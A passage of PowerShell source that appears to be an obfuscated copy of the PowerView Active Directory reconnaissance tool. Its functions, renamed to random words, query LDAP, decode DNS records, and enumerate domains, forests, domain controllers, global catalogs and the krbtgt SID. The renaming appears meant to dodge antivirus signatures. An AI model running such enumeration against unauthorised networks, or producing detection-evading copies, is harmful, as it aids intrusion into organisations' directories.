    $PjvsRTzX99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $duEvkxCp99[$_] = $PjvsRTzX99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $duEvkxCp99[$_] = $PjvsRTzX99[$_][0] -as $yVtuevuu99
            }
            elseif ($_ -eq 'samaccounttype') {
                $duEvkxCp99[$_] = $PjvsRTzX99[$_][0] -as $JAjLKlhU99
            }
            elseif ($_ -eq 'objectguid') {
                $duEvkxCp99[$_] = (New-Object Guid (,$PjvsRTzX99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $duEvkxCp99[$_] = $PjvsRTzX99[$_][0] -as $xMqsGAsx99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $hdiEMhIb99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $PjvsRTzX99[$_][0], 0
                if ($hdiEMhIb99.Owner) {
                    $duEvkxCp99['Owner'] = $hdiEMhIb99.Owner
                }
                if ($hdiEMhIb99.Group) {
                    $duEvkxCp99['Group'] = $hdiEMhIb99.Group
                }
                if ($hdiEMhIb99.DiscretionaryAcl) {
                    $duEvkxCp99['DiscretionaryAcl'] = $hdiEMhIb99.DiscretionaryAcl
                }
                if ($hdiEMhIb99.SystemAcl) {
                    $duEvkxCp99['SystemAcl'] = $hdiEMhIb99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($PjvsRTzX99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $duEvkxCp99[$_] = "NEVER"
                }
                else {
                    $duEvkxCp99[$_] = [datetime]::fromfiletime($PjvsRTzX99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($PjvsRTzX99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $PjvsRTzX99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $duEvkxCp99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $duEvkxCp99[$_] = ([datetime]::FromFileTime(($PjvsRTzX99[$_][0])))
                }
            }
            elseif ($PjvsRTzX99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $PjvsRTzX99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $duEvkxCp99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[favorites] error: $_"
                    $duEvkxCp99[$_] = $Prop[$_]
                }
            }
            elseif ($PjvsRTzX99[$_].count -eq 1) {
                $duEvkxCp99[$_] = $PjvsRTzX99[$_][0]
            }
            else {
                $duEvkxCp99[$_] = $PjvsRTzX99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $duEvkxCp99
    }
    catch {
        Write-Warning "[favorites] Error parsing LDAP properties : $_"
    }
}
function indenturing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AIbbwRks99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $udnfiLvJ99 = $gddrYpaX99
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $qgzVOkSs99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $qgzVOkSs99) {
                    $okkpAzgz99 = "$($ENV:LOGONSERVER -replace '\\','').$qgzVOkSs99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $pdUayiJv99 = retrenchments -xjRyyQze99 $xjRyyQze99
            $okkpAzgz99 = ($pdUayiJv99.PdcRoleOwner).Name
            $udnfiLvJ99 = $pdUayiJv99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $udnfiLvJ99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $udnfiLvJ99) {
                $okkpAzgz99 = "$($ENV:LOGONSERVER -replace '\\','').$udnfiLvJ99"
            }
        }
        else {
            write-verbose "get-domain"
            $pdUayiJv99 = retrenchments
            $okkpAzgz99 = ($pdUayiJv99.PdcRoleOwner).Name
            $udnfiLvJ99 = $pdUayiJv99.Name
        }
        if ($PSBoundParameters['Server']) {
            $okkpAzgz99 = $GejzMkbd99
        }
        $sOztOwxK99 = 'LDAP://'
        if ($okkpAzgz99 -and ($okkpAzgz99.Trim() -ne '')) {
            $sOztOwxK99 += $okkpAzgz99
            if ($udnfiLvJ99) {
                $sOztOwxK99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $sOztOwxK99 += $AIbbwRks99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($kNJfXSCC99 -Match '^GC://') {
                $DN = $kNJfXSCC99.ToUpper().Trim('/')
                $sOztOwxK99 = ''
            }
            else {
                if ($kNJfXSCC99 -match '^LDAP://') {
                    if ($kNJfXSCC99 -match "LDAP://.+/.+") {
                        $sOztOwxK99 = ''
                        $DN = $kNJfXSCC99
                    }
                    else {
                        $DN = $kNJfXSCC99.SubString(7)
                    }
                }
                else {
                    $DN = $kNJfXSCC99
                }
            }
        }
        else {
            if ($udnfiLvJ99 -and ($udnfiLvJ99.Trim() -ne '')) {
                $DN = "DC=$($udnfiLvJ99.Replace('.', ',DC='))"
            }
        }
        $sOztOwxK99 += $DN
        Write-Verbose "[indenturing] search base: $sOztOwxK99"
        if ($xjRyyQze99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[indenturing] Using alternate credentials for LDAP connection"
            $pdUayiJv99 = New-Object DirectoryServices.DirectoryEntry($sOztOwxK99, $xjRyyQze99.UserName, $xjRyyQze99.GetNetworkCredential().Password)
            $qnVcpqaH99 = New-Object System.DirectoryServices.DirectorySearcher($pdUayiJv99)
        }
        else {
            $qnVcpqaH99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$sOztOwxK99)
        }
        $qnVcpqaH99.PageSize = $vUSyLBJJ99
        $qnVcpqaH99.SearchScope = $yuycROvu99
        $qnVcpqaH99.CacheResults = $False
        $qnVcpqaH99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $qnVcpqaH99.ServerTimeLimit = $cNGaYdSy99
        }
        if ($PSBoundParameters['Tombstone']) {
            $qnVcpqaH99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $qnVcpqaH99.filter = $vqxjYeAS99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $qnVcpqaH99.SecurityMasks = Switch ($VnyrBvDm99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $hMTvSxMY99 = $PjvsRTzX99| ForEach-Object { $_.Split(',') }
            $Null = $qnVcpqaH99.PropertiesToLoad.AddRange(($hMTvSxMY99))
        }
        $qnVcpqaH99
    }
}
function Tsiolkovsky {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $JjVDLTsa99
    )
    BEGIN {
        function calyx {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]$IKcOZBLn99 = $Raw[0]
            [Int]$UEcBHMWg99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''
            while ($UEcBHMWg99-- -gt 0)
            {
                [Int]$GnlyuLUC99 = $Raw[$Index++]
                while ($GnlyuLUC99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        $JgURBmIU99 = [BitConverter]::ToUInt16($JjVDLTsa99, 2)
        $BYyUvLsT99 = [BitConverter]::ToUInt32($JjVDLTsa99, 8)
        $mAcOBlgS99 = $JjVDLTsa99[12..15]
        $Null = [array]::Reverse($mAcOBlgS99)
        $TTL = [BitConverter]::ToUInt32($mAcOBlgS99, 0)
        $Age = [BitConverter]::ToUInt32($JjVDLTsa99, 20)
        if ($Age -ne 0) {
            $cyYNcfuo99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $cyYNcfuo99 = '[static]'
        }
        $jmbtApTq99 = New-Object PSObject
        if ($JgURBmIU99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $JjVDLTsa99[24], $JjVDLTsa99[25], $JjVDLTsa99[26], $JjVDLTsa99[27]
            $Data = $IP
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'A'
        }
        elseif ($JgURBmIU99 -eq 2) {
            $iNsMUErw99 = calyx $JjVDLTsa99[24..$JjVDLTsa99.length]
            $Data = $iNsMUErw99
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'NS'
        }
        elseif ($JgURBmIU99 -eq 5) {
            $Alias = calyx $JjVDLTsa99[24..$JjVDLTsa99.length]
            $Data = $Alias
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }
        elseif ($JgURBmIU99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($JjVDLTsa99[24..$JjVDLTsa99.length]))
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }
        elseif ($JgURBmIU99 -eq 12) {
            $Ptr = calyx $JjVDLTsa99[24..$JjVDLTsa99.length]
            $Data = $Ptr
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }
        elseif ($JgURBmIU99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($JjVDLTsa99[24..$JjVDLTsa99.length]))
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }
        elseif ($JgURBmIU99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($JjVDLTsa99[24..$JjVDLTsa99.length]))
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'MX'
        }
        elseif ($JgURBmIU99 -eq 16) {
            [string]$TXT  = ''
            [int]$GnlyuLUC99 = $JjVDLTsa99[24]
            $Index = 25
            while ($GnlyuLUC99-- -gt 0) {
                $TXT += [char]$JjVDLTsa99[$index++]
            }
            $Data = $TXT
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }
        elseif ($JgURBmIU99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($JjVDLTsa99[24..$JjVDLTsa99.length]))
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }
        elseif ($JgURBmIU99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($JjVDLTsa99[24..$JjVDLTsa99.length]))
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }
        else {
            $Data = $([System.Convert]::ToBase64String($JjVDLTsa99[24..$JjVDLTsa99.length]))
            $jmbtApTq99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }
        $jmbtApTq99 | Add-Member Noteproperty 'UpdatedAtSerial' $BYyUvLsT99
        $jmbtApTq99 | Add-Member Noteproperty 'TTL' $TTL
        $jmbtApTq99 | Add-Member Noteproperty 'Age' $Age
        $jmbtApTq99 | Add-Member Noteproperty 'TimeStamp' $cyYNcfuo99
        $jmbtApTq99 | Add-Member Noteproperty 'Data' $Data
        $jmbtApTq99
    }
}
function McDaniel {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $VrICpjXS99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $jNZElJLj99 = indenturing @SearcherArguments
        if ($jNZElJLj99) {
            if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $jNZElJLj99.FindOne()  }
            else { $jAOXTyAF99 = $jNZElJLj99.FindAll() }
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                $Out = favorites -PjvsRTzX99 $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[enfranchisement] Error disposing of the Results object: $_"
                }
            }
            $jNZElJLj99.dispose()
        }
        $VrICpjXS99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $QIyephGW99 = indenturing @SearcherArguments
        if ($QIyephGW99) {
            try {
                if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $QIyephGW99.FindOne() }
                else { $jAOXTyAF99 = $QIyephGW99.FindAll() }
                $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                    $Out = favorites -PjvsRTzX99 $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($jAOXTyAF99) {
                    try { $jAOXTyAF99.dispose() }
                    catch {
                        Write-Verbose "[McDaniel] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[McDaniel] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $QIyephGW99.dispose()
        }
    }
}
function payment {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $xOxcoWgD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $VrICpjXS99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($xOxcoWgD99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $RGPLEbTm99 = indenturing @SearcherArguments
        if ($RGPLEbTm99) {
            if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $RGPLEbTm99.FindOne() }
            else { $jAOXTyAF99 = $RGPLEbTm99.FindAll() }
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = favorites -PjvsRTzX99 $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $xOxcoWgD99
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $ENMVRcuf99 = Tsiolkovsky -JjVDLTsa99 $Out.dnsrecord[0]
                    }
                    else {
                        $ENMVRcuf99 = Tsiolkovsky -JjVDLTsa99 $Out.dnsrecord
                    }
                    if ($ENMVRcuf99) {
                        $ENMVRcuf99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[payment] Error: $_"
                    $Out
                }
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[payment] Error disposing of the Results object: $_"
                }
            }
            $RGPLEbTm99.dispose()
        }
    }
}
function retrenchments {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[retrenchments] Using alternate credentials for retrenchments'
            if ($PSBoundParameters['Domain']) {
                $udnfiLvJ99 = $gddrYpaX99
            }
            else {
                $udnfiLvJ99 = $xjRyyQze99.GetNetworkCredential().Domain
                Write-Verbose "[retrenchments] Extracted domain '$udnfiLvJ99' from -xjRyyQze99"
            }
            $GdBBoKTV99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $udnfiLvJ99, $xjRyyQze99.UserName, $xjRyyQze99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($GdBBoKTV99)
            }
            catch {
                Write-Verbose "[retrenchments] The specified domain '$udnfiLvJ99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $GdBBoKTV99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $gddrYpaX99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($GdBBoKTV99)
            }
            catch {
                Write-Verbose "[retrenchments] The specified domain '$gddrYpaX99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[retrenchments] Error retrieving the current domain: $_"
            }
        }
    }
}
function numbed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $WDMDjRMG99 = @{}
        if ($PSBoundParameters['Domain']) { $WDMDjRMG99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Credential']) { $WDMDjRMG99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $WDMDjRMG99['Server'] = $GejzMkbd99 }
            $WDMDjRMG99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            pickerels @Arguments
        }
        else {
            $QEtxmtxZ99 = retrenchments @Arguments
            if ($QEtxmtxZ99) {
                $QEtxmtxZ99.DomainControllers
            }
        }
    }
}
function creatives {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $tebkulGE99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose "[creatives] Using alternate credentials for creatives"
            if ($PSBoundParameters['Forest']) {
                $YYfFufmF99 = $tebkulGE99
            }
            else {
                $YYfFufmF99 = $xjRyyQze99.GetNetworkCredential().Domain
                Write-Verbose "[creatives] Extracted domain '$tebkulGE99' from -xjRyyQze99"
            }
            $KKIWieaa99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $YYfFufmF99, $xjRyyQze99.UserName, $xjRyyQze99.GetNetworkCredential().Password)
            try {
                $SwmcbEIz99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($KKIWieaa99)
            }
            catch {
                Write-Verbose "[creatives] The specified forest '$YYfFufmF99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $KKIWieaa99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $tebkulGE99)
            try {
                $SwmcbEIz99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($KKIWieaa99)
            }
            catch {
                Write-Verbose "[creatives] The specified forest '$tebkulGE99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $SwmcbEIz99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($SwmcbEIz99) {
            if ($PSBoundParameters['Credential']) {
                $ASisTcvh99 = (wasteland -phaEiMpW99 "krbtgt" -gddrYpaX99 $SwmcbEIz99.RootDomain.Name -xjRyyQze99 $xjRyyQze99).objectsid
            }
            else {
                $ASisTcvh99 = (wasteland -phaEiMpW99 "krbtgt" -gddrYpaX99 $SwmcbEIz99.RootDomain.Name).objectsid
            }
            $Parts = $ASisTcvh99 -Split '-'
            $ASisTcvh99 = $Parts[0..$($Parts.length-2)] -join '-'
            $SwmcbEIz99 | Add-Member NoteProperty 'RootDomainSid' $ASisTcvh99
            $SwmcbEIz99
        }
    }
}
function tobogganing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $tebkulGE99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $WDMDjRMG99 = @{}
        if ($PSBoundParameters['Forest']) { $WDMDjRMG99['Forest'] = $tebkulGE99 }
        if ($PSBoundParameters['Credential']) { $WDMDjRMG99['Credential'] = $xjRyyQze99 }
        $SwmcbEIz99 = creatives @Arguments
        if ($SwmcbEIz99) {
            $SwmcbEIz99.Domains
        }
    }
}
function heists {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $tebkulGE99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $WDMDjRMG99 = @{}
        if ($PSBoundParameters['Forest']) { $WDMDjRMG99['Forest'] = $tebkulGE99 }
        if ($PSBoundParameters['Credential']) { $WDMDjRMG99['Credential'] = $xjRyyQze99 }
        $SwmcbEIz99 = creatives @Arguments
        if ($SwmcbEIz99) {
            $SwmcbEIz99.FindAllGlobalCatalogs()
        }
    }
}
function insurgents {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $vCFNAEmG99,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $tebkulGE99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $WDMDjRMG99 = @{}
        if ($PSBoundParameters['Forest']) { $WDMDjRMG99['Forest'] = $tebkulGE99 }
        if ($PSBoundParameters['Credential']) { $WDMDjRMG99['Credential'] = $xjRyyQze99 }
        $SwmcbEIz99 = creatives @Arguments
        if ($SwmcbEIz99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($zvGrEMcr99 in $vCFNAEmG99) {
                    $SwmcbEIz99.Schema.FindClass($zvGrEMcr99)
                }
            }
            else {
                $SwmcbEIz99.Schema.FindAllClasses()
            }
        }
    }
}
function rested {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $vCFNAEmG99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $MdKGLCTm99,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ouvBXyuL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
